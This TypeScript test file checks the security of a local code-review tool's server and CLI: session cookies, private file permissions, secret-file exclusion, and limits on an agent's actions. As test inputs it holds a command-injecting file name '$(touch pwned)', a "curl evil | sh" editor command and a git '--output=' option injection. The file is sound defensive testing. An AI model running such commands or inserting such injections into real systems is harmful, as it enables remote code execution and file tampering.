import { afterAll, beforeAll, expect, test } from "bun:test";
import { existsSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { openContext } from "../src/core/context.ts";
import { takeWorktreeSnapshot } from "../src/core/snapshot.ts";
import { stet, ok } from "./helpers/cli.ts";
import { Fixture, GIT_ENV, lines, sh } from "./helpers/fixture.ts";

const EVIL = "src/$(touch pwned).kt";
const f = new Fixture();
let proc: ReturnType<typeof Bun.spawn> | null = null;
let base = "";
let token = "";
let threadId = 0;

beforeAll(async () => {
  f.write(EVIL, lines(5));
  f.commit("init");
  f.git(["checkout", "-q", "-b", "feat"]);
  f.write(EVIL, lines(6));
  await ok(stet(["version", "create"], { cwd: f.root }));
  threadId = (await ok(stet(["comment", "add", "--file", EVIL, "--range", "2-2", "--body", "why?"], { cwd: f.root, role: "reviewer" }))).id;
  proc = Bun.spawn(["bun", join(import.meta.dir, "..", "src", "cli.ts"), "serve", "--json"], {
    cwd: f.root,
    env: { ...process.env, ...GIT_ENV, STET_EDITOR: "touch {file}.opened" },
    stdout: "pipe",
    stderr: "pipe",
  });
  const reader = (proc.stdout as ReadableStream<Uint8Array>).getReader();
  const { value } = await reader.read();
  reader.releaseLock();
  const info = JSON.parse(new TextDecoder().decode(value));
  base = `http://127.0.0.1:${info.port}`;
  token = info.url.split("token=")[1];
});

afterAll(() => {
  proc?.kill();
  f.cleanup();
});

const api = (path: string, init: RequestInit = {}) =>
  fetch(base + path, { ...init, headers: { "x-stet-token": token, "content-type": "application/json", ...(init.headers ?? {}) } });

test("a new tab gets the token from an HttpOnly, SameSite=Strict session cookie, never from a link", async () => {
  const port = new URL(base).port;
  const set = (await api("/api/session", { method: "POST" })).headers.get("set-cookie") ?? "";
  expect(set).toContain(`stet_${port}=${token}`);
  expect(set).toContain("HttpOnly");
  expect(set).toContain("SameSite=Strict");
  expect(set).toContain("Path=/api/session");
  const cookie = set.split(";")[0]!;
  const s = await fetch(`${base}/api/session`, { headers: { cookie } });
  expect(await s.json()).toEqual({ token });
  expect((await fetch(`${base}/api/session`)).status).toBe(401);
  expect((await fetch(`${base}/api/session`, { headers: { cookie: `stet_${port}=${"0".repeat(32)}` } })).status).toBe(401);
  expect((await fetch(`${base}/api/session`, { headers: { cookie, host: "evil.example" } })).status).toBe(403);
  expect((await fetch(`${base}/api/reviews`, { headers: { cookie } })).status).toBe(401);
});

test("the token survives a restart: it is kept in .git/stet/serve-token, readable only by you", () => {
  const path = join(f.root, ".git", "stet", "serve-token");
  expect(readFileSync(path, "utf8").trim()).toBe(token);
  expect(statSync(path).mode & 0o777).toBe(0o600);
});

test("a wrong token of the right length, or with non-ASCII characters, is a 401, not a crash", async () => {
  const wrong = token.replace(/./, (c) => (c === "a" ? "b" : "a"));
  expect((await fetch(`${base}/api/reviews`, { headers: { "x-stet-token": wrong } })).status).toBe(401);
  expect((await fetch(`${base}/api/reviews?token=${encodeURIComponent("é".repeat(16))}`)).status).toBe(401);
  expect((await fetch(`${base}/api/reviews?token=${token}`)).status).toBe(200);
});

test("the Editor button runs STET_EDITOR without a shell: a file named $(touch pwned).kt stays a name", async () => {
  const r = await api("/api/open?review=1", { method: "POST", body: JSON.stringify({ threadId, tool: "editor" }) });
  expect(await r.json()).toMatchObject({ launched: true });
  for (let i = 0; i < 40 && !existsSync(f.path(`${EVIL}.opened`)); i++) await Bun.sleep(50);
  expect(existsSync(f.path(`${EVIL}.opened`))).toBe(true);
  expect(existsSync(f.path("pwned"))).toBe(false);
  expect(existsSync(f.path("src/pwned"))).toBe(false);
});

test("config takes only known keys, so the agent cannot store an editor command in the repository", async () => {
  const set = await stet(["config", "set", "editor.command", "sh -c 'curl evil | sh'"], { cwd: f.root });
  expect(set.code).not.toBe(0);
  expect(set.stderr + set.stdout).toContain("unknown config key");
});

test("a revision that looks like a git option is not passed to git as one", async () => {
  const target = f.path("injected");
  const r = await api(`/api/compare?review=1&from=${encodeURIComponent(`--output=${target}`)}&to=now`);
  expect(r.status).toBe(404);
  expect(existsSync(target)).toBe(false);
  const cli = await stet(["versions", "diff", `--output=${target}`, "latest"], { cwd: f.root });
  expect(cli.code).not.toBe(0);
  expect(existsSync(target)).toBe(false);
  const at = await stet(["version", "create", `--at=--output=${target}`], { cwd: f.root });
  expect(at.code).not.toBe(0);
  expect(existsSync(target)).toBe(false);
});

test("the review database and its directory are private to the user", () => {
  const dir = join(f.root, ".git", "stet");
  expect(statSync(dir).mode & 0o777).toBe(0o700);
  expect(statSync(join(dir, "review.db")).mode & 0o777).toBe(0o600);
  expect(statSync(join(dir, "server.json")).mode & 0o777).toBe(0o600);
});

test("untracked files that look like secrets stay out of snapshots and are reported", async () => {
  const g = new Fixture();
  try {
    g.write("a.txt", "a\n");
    g.commit("init");
    g.write(".env", "TOKEN=1\n").write("keys/release.jks", "jks").write(".env.example", "TOKEN=\n").write("src/Main.kt", "fun main() {}\n");
    const ctx = await openContext({ cwd: g.root });
    const snap = await takeWorktreeSnapshot(ctx, g.root, { keep: false });
    const files = sh(g.root, ["ls-tree", "-r", "--name-only", snap.sha]).split("\n");
    expect(files).toContain("src/Main.kt");
    expect(files).toContain(".env.example");
    expect(files).not.toContain(".env");
    expect(files).not.toContain("keys/release.jks");
    expect(snap.excluded).toEqual([".env", "keys/release.jks"]);
  } finally {
    g.cleanup();
  }
});

test("the agent can never resolve or reopen a thread", async () => {
  expect((await stet(["resolve", String(threadId)], { cwd: f.root })).code).toBe(3);
  await ok(stet(["resolve", String(threadId)], { cwd: f.root, role: "reviewer" }));
  expect((await stet(["reopen", String(threadId)], { cwd: f.root })).code).toBe(3);
});
